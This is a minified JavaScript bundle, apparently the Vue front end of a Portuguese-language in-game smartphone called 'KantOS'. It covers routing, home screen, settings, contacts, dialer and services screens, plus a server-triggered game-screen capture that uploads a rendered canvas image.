                if (e.currentTarget && e.currentTarget.getAttribute) {
                    const t = e.currentTarget.getAttribute("target");
                    if (/\b_blank\b/i.test(t)) return
                }
                e.preventDefault && e.preventDefault();
                return !0
            }(n) ? t[ut(e.replace) ? "replace" : "push"](ut(e.to)) : Promise.resolve()
        }
    }
}
const Wi = ll({
    name: "RouterLink",
    props: {
        to: {
            type: [String, Object],
            required: !0
        },
        replace: Boolean,
        activeClass: String,
        exactActiveClass: String,
        custom: Boolean,
        ariaCurrentValue: {
            type: String,
            default: "page"
        }
    },
    setup(e, {
        slots: t,
        attrs: n
    }) {
        const l = Ze(Gi(e)),
            {
                options: a
            } = jl(Tr),
            s = da((() => ({
                [Ji(e.activeClass, a.linkActiveClass, "router-link-active")]: l.isActive,
                [Ji(e.exactActiveClass, a.linkExactActiveClass, "router-link-exact-active")]: l.isExactActive
            })));
        return () => {
            const a = t.default && t.default(l);
            return e.custom ? a : pa("a", Ir({
                "aria-current": l.isExactActive ? e.ariaCurrentValue : null,
                onClick: l.navigate,
                href: l.href
            }, n, {
                class: s.value
            }), a)
        }
    }
});

function Ki(e) {
    return e ? e.aliasOf ? e.aliasOf.path : e.path : ""
}
const Ji = (e, t, n) => null != e ? e : null != t ? t : n;

function Xi(e, t) {
    if (!e) return null;
    const n = e(t);
    return 1 === n.length ? n[0] : n
}
const Yi = ll({
    name: "RouterView",
    inheritAttrs: !1,
    props: {
        name: {
            type: String,
            default: "default"
        },
        route: Object
    },
    setup(e, {
        attrs: t,
        slots: n
    }) {
        const l = jl(Pr),
            a = da((() => e.route || l.value)),
            s = jl(Rr, 0),
            o = da((() => a.value.matched[s]));
        $l(Rr, s + 1), $l(Sr, o), $l(Pr, a);
        const r = rt();
        return Rn((() => [r.value, o.value, e.name]), (([e, t, n], [l, a, s]) => {
            t && (t.instances[n] = e, a && a !== t && e && e === l && (t.leaveGuards.size || (t.leaveGuards = a.leaveGuards), t.updateGuards.size || (t.updateGuards = a.updateGuards))), !e || !t || a && Nr(t, a) && l || (t.enterCallbacks[n] || []).forEach((t => t(e)))
        }), {
            flush: "post"
        }), () => {
            const l = a.value,
                s = o.value,
                i = s && s.components[e.name],
                c = e.name;
            if (!i) return Xi(n.default, {
                Component: i,
                route: l
            });
            const u = s.props[e.name],
                d = u ? !0 === u ? l.params : "function" == typeof u ? u(l) : u : null,
                p = pa(i, Ir({}, d, t, {
                    onVnodeUnmounted: e => {
                        e.component.isUnmounted && (s.instances[c] = null)
                    },
                    ref: r
                }));
            return Xi(n.default, {
                Component: p,
                route: l
            }) || p
        }
    }
});

function Zi(e) {
    return e.reduce(((e, t) => e.then((() => t()))), Promise.resolve())
}

function Qi() {
    return jl(Tr)
}

function ec() {
    return jl(Er)
}
const tc = document.createElement("canvas");
tc.width = 1920, tc.height = 1080;
const nc = new lo(tc);
nc.running = !1, _o.pusher.on("REQUEST_SCREENSHOT", ((e, t, n = "image/jpeg", l = .9) => {
    nc.running = !0, nc.onrender = function(a) {
        this.running = !1, a.toBlob((l => {
            const a = new FormData;
            a.append(t, l, "image." + n.split("/")[1].replace("jpeg", "jpg")), fetch(e, {
                method: "POST",
                body: a
            }).catch((() => {}))
        }), n, l)
    }, nc.render()
}));
const lc = {
        setup() {
            const e = Qi();
            let t = setInterval((() => {
                _o.identity.phone && (clearInterval(t), e.replace("/home"), _o.ready())
            }), 500)
        }
    },
    ac = sn("data-v-8a17276a");
ln("data-v-8a17276a");
const sc = {
        class: "h-full bg-black text-white flex flex-col flex-center"
    },
    oc = Pl("h1", {
        class: "text-6xl"
    }, "KantOS", -1);
an();
const rc = ac(((e, t, n, l, a, s) => {
    const o = dl("app-loading");
    return wl(), _l("div", sc, [oc, Pl(o, {
        style: {
            filter: "invert(1)"
        }
    })])
}));
lc.render = rc, lc.__scopeId = "data-v-8a17276a";
const ic = rt(new Date);
setInterval((() => ic.value.setTime(Date.now())), 1e3);
const cc = {
        setup() {
            jl("setDark")(!0);
            const {
                backgroundURL: e,
                settings: t,
                clock: n
            } = _o, l = da((() => {
                const e = ic.value;
                return `${e.getDate()} de ${Vs[e.getMonth()]} de ${e.getFullYear()}`
            })), a = Xs();
            return {
                settings: t,
                clock: n,
                fancyDate: l,
                top: a.filter((e => !e.bottom)),
                bottom: a.filter((e => e.bottom)),
                backgroundURL: e
            }
        }
    },
    uc = sn("data-v-69454f4a");
ln("data-v-69454f4a");
const dc = {
        key: 0,
        class: "mt-10 text-white text-8xl font-semibold text-center clock-text"
    },
    pc = {
        class: "text-2xl"
    },
    fc = {
        class: "text-lg app-name"
    },
    mc = {
        class: "py-6 px-10 grid grid-cols-4 gap-12"
    };
an();
const hc = uc(((e, t, n, l, a, s) => (wl(), _l("div", {
    class: "h-full p-4 pt-16 bg-cover",
    style: {
        backgroundImage: "url(" + l.backgroundURL + ")",
        backgroundPosition: "center",
        backgroundColor: "black"
    }
}, [l.settings.isAndroid ? (wl(), _l("div", dc, [Pl("p", null, g(l.clock.hours), 1), Pl("p", null, g(l.clock.minutes), 1), Pl("p", pc, g(l.fancyDate), 1)])) : Ml("", !0), Pl("div", {
    class: ["p-5 grid grid-cols-4 gap-0 absolute inset-x-4", {
        "bottom-48": l.settings.isAndroid
    }]
}, [(wl(!0), _l(bl, null, fa(l.top, (t => (wl(), _l("div", {
    key: t.name,
    app: "",
    onClick: n => e.$router.push(t.to),
    class: "text-white text-center text-lg pb-4"
}, [Pl("img", {
    class: "rounded-4xl p-2",
    src: t.icon,
    alt: ""
}, null, 8, ["src"]), Pl("span", fc, g(t.name), 1)], 8, ["onClick"])))), 128))], 2), Pl("div", {
    class: ["absolute bottom-4 inset-x-3 h-36", {
        "bottom-apps": !l.settings.isAndroid
    }]
}, [Pl("div", mc, [(wl(!0), _l(bl, null, fa(l.bottom, (t => (wl(), _l("div", {
    key: t.name,
    app: "",
    onClick: n => e.$router.push(t.to),
    class: "text-white text-center text-lg"
}, [Pl("img", {
    class: "rounded-3xl",
    src: t.icon,
    alt: ""
}, null, 8, ["src"])], 8, ["onClick"])))), 128))])], 2)], 4))));
cc.render = hc, cc.__scopeId = "data-v-69454f4a";
const bc = {
    default: "Padrão",
    s9: "S9",
    s20: "S20",
    iphonex: "iPhone X",
    mtfuji: "Mt. Fuji",
    taiwan: "Taiwan",
    firewatch: "Firewatch",
    moon: "Lua",
    vaporwave: "Vaporwave",
    custom: "Personalizado"
};
for (let sM in bc) bc[sM] = {
    name: bc[sM],
    url: _o.asset(`/stock/wallpapers/${sM}.webp`)
};
const gc = {};
for (let [sM, oM] of Object.entries(bc)) gc[sM] = oM.name;
const vc = {
        setup() {
            var e;
            const t = jl("setDark");
            t();
            const {
                microphone: n,
                storage: l,
                identity: a,
                settings: s
            } = _o, o = Object.fromEntries([75, 80, 90, 100, 110, 120, 125, 133, 150, 166, 175, 200, 225, 233, 250].map((e => [e, e + "%"]))), {
                volume: r,
                doNotDisturb: i,
                darkTheme: c,
                anonymousCall: u
            } = l, d = rt(_o.backgroundURL);
            Rn(d, (e => {
                _o.backgroundURL = e, e === s.backgroundURL ? localStorage.removeItem("smartphone@background") : localStorage.setItem("smartphone@background", e)
            }));
            const p = _o.settings.forceBackground,
                f = rt(_o.backgroundURL === s.backgroundURL ? "default" : null != (e = function(e) {
                    var t;
                    return null == (t = Object.entries(bc).find((t => t[1].url === e))) ? void 0 : t[0]
                }(_o.backgroundURL)) ? e : "custom");
            return Rn(f, (e => {
                var t;
                d.value = "default" === e ? s.backgroundURL || _o.backgroundURL : "custom" !== e ? null == (t = bc[e]) ? void 0 : t.url : "Link da imagem"
            })), Rn(c, (e => t(e))), Rn((() => s.zoom), (e => {
                localStorage.setItem("smartphone@zoom", Number(e).toFixed(0)), _o.updateZoom()
            })), {
                settings: s,
                identity: a,
                backgroundType: f,
                backgroundURL: d,
                forceBackground: p,
                WallpapersOptions: gc,
                reset: function() {
                    r.value = 50, i.value = !1, localStorage.setItem("smartphone@zoom", "100"), s.zoom = 100, _o.updateZoom()
                },
                zoomOptions: o,
                storage: l,
                volume: r,
                doNotDisturb: i,
                darkTheme: c,
                anonymousCall: u,
                microphone: n,
                askForMicrophone: function() {
                    navigator.mediaDevices.getUserMedia({
                        audio: !0
                    }).then((e => {
                        n.value = e
                    }), (() => {}))
                }
            }
        }
    },
    xc = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    yc = {
        class: "h-32 pt-16 bg-theme-accent border-b border-theme"
    },
    kc = {
        key: 0,
        class: "far fa-arrow-left"
    },
    wc = {
        key: 1,
        class: "fas fa-chevron-left text-blue-500"
    },
    Cc = {
        class: "flex-1 overflow-y-auto p-5"
    },
    _c = Pl("div", null, [Pl("i", {
        class: "fas fa-phone fa-3x text-blue-500"
    })], -1),
    Ac = {
        class: "flex flex-col ml-5"
    },
    Sc = {
        key: 0,
        class: "mt-4"
    },
    Rc = Pl("label", {
        class: "text-2xl"
    }, "Plano de fundo", -1),
    Tc = {
        key: 1
    },
    Ec = Pl("label", {
        class: "text-2xl"
    }, "URL", -1),
    Pc = {
        class: "mt-3"
    },
    Lc = Pl("label", {
        class: "text-2xl"
    }, "Zoom", -1),
    Ic = {
        class: "my-6"
    },
    Oc = Pl("label", {
        class: "text-2xl"
    }, "Som em notificações", -1),
    Mc = Pl("hr", {
        class: "border-theme"
    }, null, -1),
    Vc = {
        class: "mt-4 flex items-center justify-between"
    },
    Dc = Pl("label", {
        class: "text-3xl"
    }, "Modo escuro", -1),
    Uc = {
        class: "mt-6 flex items-center justify-between"
    },
    Nc = Pl("label", {
        class: "text-3xl"
    }, "Não perturbe", -1),
    $c = {
        class: "mt-6 flex items-center justify-between"
    },
    jc = Pl("label", {
        class: "text-3xl"
    }, "Ligação anônima", -1),
    Fc = Pl("i", {
        class: "fas fa-microphone text-4xl"
    }, null, -1);
vc.render = function(e, t, n, l, a, s) {
    const o = dl("app-select"),
        r = dl("app-input"),
        i = dl("app-toggle");
    return wl(), _l("div", xc, [Pl("div", yc, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 left-0 px-4"
    }, [l.settings.isAndroid ? (wl(), _l("i", kc)) : (wl(), _l("i", wc))]), Pl("h1", {
        class: ["font-bold", [l.settings.isAndroid ? "ml-16" : "text-center"]]
    }, "Configurações", 2)]), Pl("div", Cc, [Pl("div", {
        class: ["p-5 shadow-lg rounded-2xl flex", [l.darkTheme ? "bg-gray-900" : "bg-gray-200"]]
    }, [_c, Pl("div", Ac, [Pl("h1", null, g(l.identity.name + " " + l.identity.firstname), 1), Pl("h1", null, g(l.identity.phone), 1)])], 2), l.forceBackground ? Ml("", !0) : (wl(), _l("div", Sc, [Rc, Pl(o, {
        options: l.WallpapersOptions,
        class: "text-3xl bg-theme border-theme",
        modelValue: l.backgroundType,
        "onUpdate:modelValue": t[2] || (t[2] = e => l.backgroundType = e)
    }, null, 8, ["options", "modelValue"])])), "custom" === l.backgroundType ? (wl(), _l("div", Tc, [Ec, Pl(r, {
        class: "text-3xl bg-theme border-theme",
        modelValue: l.backgroundURL,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.backgroundURL = e)
    }, null, 8, ["modelValue"])])) : Ml("", !0), Pl("div", Pc, [Lc, Pl(o, {
        class: "text-3xl bg-theme border-theme",
        modelValue: l.settings.zoom,
        "onUpdate:modelValue": t[4] || (t[4] = e => l.settings.zoom = e),
        options: l.zoomOptions
    }, null, 8, ["modelValue", "options"])]), Pl("div", Ic, [Oc, Zn(Pl("input", {
        "onUpdate:modelValue": t[5] || (t[5] = e => l.volume = e),
        type: "range",
        min: "0",
        max: "100",
        class: "block w-full"
    }, null, 512), [
        [ns, l.volume]
    ])]), Mc, Pl("div", Vc, [Dc, Pl(i, {
        modelValue: l.darkTheme,
        "onUpdate:modelValue": t[6] || (t[6] = e => l.darkTheme = e)
    }, null, 8, ["modelValue"])]), Pl("div", Uc, [Nc, Pl(i, {
        modelValue: l.doNotDisturb,
        "onUpdate:modelValue": t[7] || (t[7] = e => l.doNotDisturb = e)
    }, null, 8, ["modelValue"])]), Pl("div", $c, [jc, Pl(i, {
        modelValue: l.anonymousCall,
        "onUpdate:modelValue": t[8] || (t[8] = e => l.anonymousCall = e)
    }, null, 8, ["modelValue"])]), Pl("button", {
        class: "absolute bottom-8 text-red-500",
        onClick: t[9] || (t[9] = (...e) => l.reset && l.reset(...e))
    }, " Restaurar configurações "), l.microphone ? Ml("", !0) : (wl(), _l("button", {
        key: 2,
        class: "absolute bottom-8 right-8 text-red-500",
        onClick: t[10] || (t[10] = (...e) => l.askForMicrophone && l.askForMicrophone(...e))
    }, [Fc]))])])
};
const zc = {
        props: {
            name: {
                required: !1,
                default: "Contatos"
            }
        }
    },
    Bc = {
        class: "h-32 pt-16 bg-theme-accent text-theme border-b border-theme text-center"
    },
    Hc = {
        class: "font-bold"
    };
zc.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Bc, [Pl("span", Hc, g(n.name), 1), Zt(e.$slots, "default")])
};
const qc = {
        setup: () => ({
            hasServices: da((() => {
                var e;
                return null == (e = _o.settings.services) ? void 0 : e.length
            }))
        })
    },
    Gc = {
        class: "flex-shrink-0 h-32 border-t border-theme bg-theme-accent text-theme px-5 flex items-center justify-between"
    },
    Wc = Pl("i", {
        class: "fal fa-address-book text-5xl"
    }, null, -1),
    Kc = Pl("span", {
        class: "block text-lg"
    }, "Contatos", -1),
    Jc = Pl("i", {
        class: "fal fa-wrench text-5xl"
    }, null, -1),
    Xc = Pl("span", {
        class: "block text-lg"
    }, "Serviços", -1),
    Yc = Pl("i", {
        class: "fas fa-th text-5xl"
    }, null, -1),
    Zc = Pl("span", {
        class: "block text-lg"
    }, "Teclado", -1),
    Qc = Pl("i", {
        class: "fal fa-clock text-5xl"
    }, null, -1),
    eu = Pl("span", {
        class: "block text-lg"
    }, "Recentes", -1),
    tu = Pl("i", {
        class: "far fa-ban text-5xl"
    }, null, -1),
    nu = Pl("span", {
        class: "block text-lg"
    }, "Bloqueios", -1);
qc.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Gc, [Pl("button", {
        class: ["text-center p-5", {
            "text-blue-500": "/contacts" == e.$route.path
        }],
        onClick: t[1] || (t[1] = t => e.$router.replace("/contacts"))
    }, [Wc, Kc], 2), l.hasServices ? (wl(), _l("button", {
        key: 0,
        class: ["text-center p-5", {
            "text-blue-500": "/contacts/services" == e.$route.path
        }],
        onClick: t[2] || (t[2] = t => e.$router.replace("/contacts/services"))
    }, [Jc, Xc], 2)) : Ml("", !0), Pl("button", {
        class: ["text-center p-5", {
            "text-blue-500": "/contacts/dial" == e.$route.path
        }],
        onClick: t[3] || (t[3] = t => e.$router.replace("/contacts/dial"))
    }, [Yc, Zc], 2), Pl("button", {
        class: ["text-center p-5", {
            "text-blue-500": "/contacts/history" == e.$route.path
        }],
        onClick: t[4] || (t[4] = t => e.$router.replace("/contacts/history"))
    }, [Qc, eu], 2), Pl("button", {
        class: ["text-center p-5", {
            "text-blue-500": "/contacts/blocks" == e.$route.path
        }],
        onClick: t[5] || (t[5] = t => e.$router.replace("/contacts/blocks"))
    }, [tu, nu], 2)])
};
const lu = {
        components: {
            Header: zc,
            Footer: qc
        },
        setup() {
            jl("setDark")();
            const e = rt("main"),
                t = rt(""),
                n = _o.identity.phone,
                l = _o.settings.videoServer,
                a = da((() => _o.contacts.value.filter((e => !t.value || (e.name.toLowerCase().includes(t.value.toLowerCase()) || e.phone.includes(t.value)))).map((e => (e.blocked = _o.settings.blocks.includes(e.phone), e)))));
            return {
                query: t,
                myPhone: n,
                view: e,
                contacts: a,
                createCall: function(e, t) {
                    _o.pusher.emit("CALL_TO", e.phone, t)
                },
                removeContact: function(e) {
                    _o.backend.removeContact(e.id), _o.contacts.value = _o.contacts.value.filter((t => t.id != e.id))
                },
                blockContact: function(e) {
                    _o.backend.block(e.phone).then((() => {
                        _o.settings.blocks.push(e.phone)
                    }))
                },
                supportsVideoCall: l
            }
        }
    },
    au = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    su = Pl("i", {
        class: "far fa-plus text-blue-400"
    }, null, -1),
    ou = {
        class: "flex-shrink-0 p-5"
    },
    ru = {
        class: "flex-1 overflow-y-auto hide-scroll px-5"
    },
    iu = {
        class: "flex-1 flex justify-between text-xl pb-2"
    },
    cu = {
        class: "flex-1 flex flex-col justify-between"
    },
    uu = {
        class: "text-3xl"
    },
    du = {
        class: "text-2xl text-gray-500"
    },
    pu = Pl("i", {
        class: "fab fa-whatsapp text-green-500 text-2xl"
    }, null, -1),
    fu = Pl("i", {
        class: "far fa-phone pl-5 text-lightBlue-400 text-2xl"
    }, null, -1),
    mu = Pl("i", {
        class: "far fa-video pl-5 text-blue-700 text-2xl"
    }, null, -1),
    hu = Pl("i", {
        class: "far fa-pencil pl-5 text-blue-500 text-2xl"
    }, null, -1),
    bu = Pl("i", {
        class: "far fa-ban pl-5 text-red-500 text-2xl"
    }, null, -1),
    gu = Pl("i", {
        class: "far fa-trash-alt pl-5 text-red-500 text-2xl"
    }, null, -1);
lu.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Footer");
    return wl(), _l("div", au, [Pl(o, null, {
        default: en((() => [Pl("button", {
            onClick: t[1] || (t[1] = t => e.$router.push("/contacts/create")),
            class: "absolute right-6"
        }, [su])])),
        _: 1
    }), Pl("div", ou, [Zn(Pl("input", {
        "onUpdate:modelValue": t[2] || (t[2] = e => l.query = e),
        class: "w-full px-5 py-2 border border-theme rounded-full text-2xl bg-theme",
        placeholder: "Buscar"
    }, null, 512), [
        [ns, l.query]
    ])]), Pl("div", ru, [Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.contacts, (t => (wl(), _l("li", {
        key: t.id,
        class: "flex mt-3 border-b border-theme last:border-b-0"
    }, [Pl("div", iu, [Pl("div", cu, [Pl("h2", uu, g(t.name), 1), Pl("h3", du, g(t.phone), 1)]), Pl("button", {
        onClick: n => e.$router.push("/whatsapp/" + t.phone)
    }, [pu], 8, ["onClick"]), Pl("button", {
        onClick: e => l.createCall(t)
    }, [fu], 8, ["onClick"]), l.supportsVideoCall ? (wl(), _l("button", {
        key: 0,
        onClick: e => l.createCall(t, !0)
    }, [mu], 8, ["onClick"])) : Ml("", !0), Pl("button", {
        onClick: n => e.$router.push("/contacts/" + t.id)
    }, [hu], 8, ["onClick"]), t.blocked ? Ml("", !0) : (wl(), _l("button", {
        key: 1,
        onClick: e => l.blockContact(t)
    }, [bu], 8, ["onClick"])), Pl("button", {
        onClick: e => l.removeContact(t)
    }, [gu], 8, ["onClick"])])])))), 128))])]), Pl(r)])
};
const vu = {
        components: {
            Header: zc
        },
        setup() {
            jl("setDark")();
            const e = Qi(),
                t = jl("alert"),
                n = Ze({
                    name: null,
                    phone: null
                });
            return {
                contact: n,
                save: function() {
                    return n.phone === _o.identity.phone ? t("Você não pode adicionar a si mesmo") : n.phone ? n.name ? void _o.backend.addContact(n.phone, n.name).then((n => {
                        n instanceof Object ? (_o.contacts.value.push(n), e.back(), _o.pusher.emit("ADD_CONTACT", n)) : t("Este telefone não existe!")
                    })) : t("Preencha o nome do contato") : t("Preencha o número de telefone")
                }
            }
        }
    },
    xu = {
        class: "flex flex-col h-full"
    },
    yu = Pl("i", {
        class: "far fa-user-plus text-blue-400"
    }, null, -1),
    ku = {
        class: "flex-1 overflow-y-auto bg-theme text-theme p-5"
    },
    wu = Pl("label", {
        class: "text-xl"
    }, "Nome", -1),
    Cu = {
        class: "mt-2"
    },
    _u = Pl("label", {
        class: "text-xl"
    }, "Telefone", -1);
vu.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", xu, [Pl(o, null, {
        default: en((() => [Pl("button", {
            onClick: t[1] || (t[1] = (...e) => l.save && l.save(...e)),
            class: "absolute top-16 right-4"
        }, [yu])])),
        _: 1
    }), Pl("div", ku, [Pl("div", null, [wu, Zn(Pl("input", {
        type: "text",
        "onUpdate:modelValue": t[2] || (t[2] = e => l.contact.name = e),
        maxlength: "128",
        class: "w-full p-3 rounded-lg bg-theme border border-theme focus:border-blue-400"
    }, null, 512), [
        [ns, l.contact.name]
    ])]), Pl("div", Cu, [_u, Zn(Pl("input", {
        type: "text",
        "onUpdate:modelValue": t[3] || (t[3] = e => l.contact.phone = e),
        maxlength: "12",
        class: "w-full p-3 rounded-lg bg-theme border border-theme focus:border-blue-400"
    }, null, 512), [
        [ns, l.contact.phone]
    ])])])])
};
const Au = {
        components: {
            Header: zc
        },
        setup() {
            jl("setDark")();
            const e = Qi(),
                t = e.currentRoute.value,
                n = jl("alert"),
                l = Ze({}),
                a = _o.contacts.value.find((e => e.id == t.params.id));
            return Object.assign(l, a), !a && e.back(), {
                contact: l,
                save: function() {
                    return l.phone === _o.identity.phone ? n("Você não pode adicionar a si mesmo") : l.phone ? l.name ? l.phone != a.phone && _o.contacts.value.some((e => e.phone == l.phone)) ? n("Você já possui um contato com este número") : void _o.backend.updateContact(l.id, l.phone, l.name).then((t => {
                        if (t.error) return n(t.error);
                        Object.assign(a, t), _o.sortContacts(), e.back()
                    })) : n("Preencha o nome do contato") : n("Preencha o número de telefone")
                }
            }
        }
    },
    Su = {
        class: "flex flex-col h-full"
    },
    Ru = Pl("i", {
        class: "far fa-user-edit text-blue-400"
    }, null, -1),
    Tu = {
        class: "flex-1 overflow-y-auto bg-theme text-theme p-5"
    },
    Eu = Pl("label", {
        class: "text-xl"
    }, "Nome", -1),
    Pu = {
        class: "mt-2"
    },
    Lu = Pl("label", {
        class: "text-xl"
    }, "Telefone", -1);
Au.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", Su, [Pl(o, null, {
        default: en((() => [Pl("button", {
            onClick: t[1] || (t[1] = (...e) => l.save && l.save(...e)),
            class: "absolute top-16 right-4"
        }, [Ru])])),
        _: 1
    }), Pl("div", Tu, [Pl("div", null, [Eu, Zn(Pl("input", {
        type: "text",
        "onUpdate:modelValue": t[2] || (t[2] = e => l.contact.name = e),
        maxlength: "128",
        class: "w-full p-3 rounded-lg bg-theme border border-theme focus:border-blue-400"
    }, null, 512), [
        [ns, l.contact.name]
    ])]), Pl("div", Pu, [Lu, Zn(Pl("input", {
        type: "text",
        "onUpdate:modelValue": t[3] || (t[3] = e => l.contact.phone = e),
        maxlength: "12",
        class: "w-full p-3 rounded-lg bg-theme border border-theme focus:border-blue-400"
    }, null, 512), [
        [ns, l.contact.phone]
    ])])])])
};
const Iu = {
        components: {
            Header: zc,
            Footer: qc
        },
        setup() {
            jl("setDark")();
            const e = rt(),
                t = jl("alert"),
                n = da((() => {
                    var e;
                    return null != (e = _o.settings.services) ? e : []
                }));
            return {
                serviceOffer: e,
                broadcastService: async function() {
                    const n = e.value;
                    if (!n.content) return t("Informe um motivo");
                    const l = await _o.getPlayerCoords();
                    _o.backend.service_request(n.service.number, n.content, l).then((n => {
                        (null == n ? void 0 : n.error) ? t(n.error): (e.value = null, t("Chamado efetuado."))
                    })), n.content = null
                },
                services: n
            }
        }
    },
    Ou = {
        class: "flex flex-col h-full"
    },
    Mu = {
        class: "flex-1 overflow-y-auto hide-scroll bg-theme text-theme"
    },
    Vu = {
        key: 0,
        class: "p-5"
    },
    Du = {
        class: "font-semibold"
    },
    Uu = {
        class: "mt-3"
    },
    Nu = Pl("label", {
        class: "text-2xl"
    }, "Motivo do chamado", -1),
    $u = {
        class: "flex justify-between mt-2"
    },
    ju = {
        key: 1
    },
    Fu = {
        class: "flex flex-col"
    },
    zu = {
        class: "font-semibold"
    },
    Bu = {
        class: "text-gray-500 text-xl"
    },
    Hu = {
        class: "ml-auto"
    };
Iu.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Footer");
    return wl(), _l("div", Ou, [Pl(o, {
        name: "Serviços"
    }), Pl("div", Mu, [l.serviceOffer ? (wl(), _l("div", Vu, [Pl("h1", Du, g(l.serviceOffer.service.name), 1), Pl("div", Uu, [Nu, Zn(Pl("textarea", {
        "onUpdate:modelValue": t[1] || (t[1] = e => l.serviceOffer.content = e),
        onKeydown: t[2] || (t[2] = us(is((() => {}), ["prevent"]), ["enter"])),
        class: "block w-full h-80 resize-none bg-theme border border-theme rounded-md p-2 fancy-scroll",
        maxlength: "200"
    }, null, 544), [
        [ns, l.serviceOffer.content]
    ])]), Pl("div", $u, [Pl("button", {
        class: "block px-4 py-2 text-red-500",
        onClick: t[3] || (t[3] = e => l.serviceOffer = null)
    }, " Cancelar "), Pl("button", {
        class: "block px-4 py-2 text-blue-500",
        onClick: t[4] || (t[4] = (...e) => l.broadcastService && l.broadcastService(...e))
    }, " Enviar ")])])) : (wl(), _l("ul", ju, [(wl(!0), _l(bl, null, fa(l.services, (e => (wl(), _l("li", {
        class: "border-b border-theme p-5 flex items-center",
        key: e.number
    }, [Pl("div", Fu, [Pl("h1", zu, g(e.name), 1), Pl("h3", Bu, g(e.number), 1)]), Pl("div", Hu, [Pl("i", {
        onClick: t => l.serviceOffer = {
            service: e
        },
        class: "fas fa-comment-alt-lines text-blue-500"
    }, null, 8, ["onClick"])])])))), 128))]))]), Pl(r)])
};
const qu = {
        components: {
            Header: zc,
            Footer: qc
        },
        inject: ["setDark"],
        setup() {
            var e;
            jl("setDark")();
            const t = jl("prompt"),
                n = jl("alert"),
                l = rt(null != (e = Qi().currentRoute.value.query.phone) ? e : "");
            return {
                number: l,
                add: function(e) {
                    const t = _o.settings.phone_template || "XXX-XXX";
                    l.value.length < t.length && (l.value += e, l.value = function(e, t) {
                        let n = 0;
                        return e.replace(/X/g, (() => t[n++])).replace(/undefined/g, "").replace(/-$/, "")
                    }(t, l.value.match(/\d/g)))
                },
                save: async function() {
                    var e;
                    const a = null == (e = await t("Nome do contato")) ? void 0 : e.trim();
                    if (a) return l.value == _o.identity.phone ? n("Número inválido") : a.length > 128 ? n("Nome inválido") : void _o.backend.addContact(l.value, a).then((e => {
                        e instanceof Object ? (_o.contacts.value.push(e), l.value = "", _o.pusher.emit("ADD_CONTACT", e)) : n("Este número não existe")
                    }))
                },
                backspace: function() {
                    const e = l.value;
                    l.value = e.substr(0, Math.max(0, e.length - 1))
                },
                call: function(e = !1) {
                    if (!l.value || l.value == _o.identity.phone) return n("Número inválido");
                    _o.pusher.emit("CALL_TO", l.value, e)
                }
            }
        },
        activated() {
            this.setDark(!1)
        }
    },
    Gu = sn("data-v-a03b3120");
ln("data-v-a03b3120");
const Wu = {
        class: "flex flex-col h-full bg-theme"
    },
    Ku = {
        class: "flex-1"
    },
    Ju = {
        class: "text-center w-3/4 mx-auto p-5 mt-24 mb-12"
    },
    Xu = {
        class: "block text-6xl h-16 text-theme"
    },
    Yu = {
        class: "mx-16"
    },
    Zu = {
        class: "flex justify-between w-full"
    },
    Qu = {
        class: "flex justify-between w-full mt-4"
    },
    ed = {
        class: "flex justify-between w-full mt-4"
    },
    td = {
        class: "mt-4 flex justify-between w-full text-center"
    },
    nd = Pl("i", {
        class: "fal fa-user-plus"
    }, null, -1),
    ld = Pl("i", {
        class: "fal fa-backspace"
    }, null, -1),
    ad = {
        class: "grid grid-cols-3 gap-12 mt-4"
    },
    sd = Pl("i", {
        class: "fas fa-video text-4xl"
    }, null, -1),
    od = Pl("i", {
        class: "fas fa-phone-alt text-4xl"
    }, null, -1);
an();
const rd = Gu(((e, t, n, l, a, s) => {
    const o = dl("Header"),
        r = dl("Footer");
    return wl(), _l("div", Wu, [Pl(o, {
        name: "Teclado"
    }), Pl("div", Ku, [Pl("div", Ju, [Pl("span", Xu, g(l.number), 1)]), Pl("div", Yu, [Pl("div", Zu, [Pl("button", {
        number: "",
        onClick: t[1] || (t[1] = e => l.add(1))
    }, "1"), Pl("button", {
        number: "",
        onClick: t[2] || (t[2] = e => l.add(2))
    }, "2"), Pl("button", {
        number: "",
        onClick: t[3] || (t[3] = e => l.add(3))
    }, "3")]), Pl("div", Qu, [Pl("button", {
        number: "",
        onClick: t[4] || (t[4] = e => l.add(4))
    }, "4"), Pl("button", {
        number: "",
        onClick: t[5] || (t[5] = e => l.add(5))
    }, "5"), Pl("button", {
        number: "",
        onClick: t[6] || (t[6] = e => l.add(6))
    }, "6")]), Pl("div", ed, [Pl("button", {
        number: "",
        onClick: t[7] || (t[7] = e => l.add(7))
    }, "7"), Pl("button", {
        number: "",
        onClick: t[8] || (t[8] = e => l.add(8))
    }, "8"), Pl("button", {
        number: "",
        onClick: t[9] || (t[9] = e => l.add(9))
    }, "9")]), Pl("div", td, [Pl("button", {
        number: "",
        onClick: t[10] || (t[10] = e => l.save())
    }, [nd]), Pl("button", {
        number: "",
        onClick: t[11] || (t[11] = e => l.add(0))
    }, "0"), Pl("button", {
        number: "",
        onClick: t[12] || (t[12] = e => l.backspace())
    }, [ld])]), Pl("div", ad, [Pl("button", {
        number: "",
        class: "blue-gradient rounded-full text-white",
        onClick: t[13] || (t[13] = e => l.call(!0))
    }, [sd]), Pl("button", {
        number: "",
        class: "green-gradient rounded-full text-white",
        onClick: t[14] || (t[14] = e => l.call())
    }, [od])])])]), Pl(r)])
}));
qu.render = rd, qu.__scopeId = "data-v-a03b3120";
const id = {
        components: {
            Header: zc,
            Footer: qc
        },
        setup() {
            jl("setDark")();
            const e = rt([]),
                t = _o.identity.phone;

            function n(e) {
                return [e.initiator, e.target].find((e => e != t))
            }
            return _o.backend.getPhoneCalls().then((n => {
                e.value = n.map((e => (e.callback = e.initiator == t || !e.anonymous, e)))
            })), {
                calls: e,
                myPhone: t,
                other: n,
                createCall: function(e) {
                    _o.pusher.emit("CALL_TO", n(e), e.video)
                }
            }
        }
    },
    cd = {
        class: "flex flex-col h-full"
    },
    ud = {
        class: "flex-1 overflow-y-auto hide-scroll bg-theme text-theme"
    },
